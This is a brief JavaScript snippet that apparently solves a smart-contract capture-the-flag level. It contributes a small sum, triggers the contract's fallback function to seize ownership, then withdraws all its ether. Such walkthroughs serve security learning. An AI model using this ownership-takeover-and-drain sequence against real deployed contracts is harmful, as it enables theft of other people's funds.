// contribute since fallback function requires previous contribution
await contract.contribute.sendTransaction({value: toWei('0.0001')})
// trigger fallback function to make myself owner
await contract.send(toWei('0.00001'))
// withdraw all ETH to owner
await contract.withdraw()
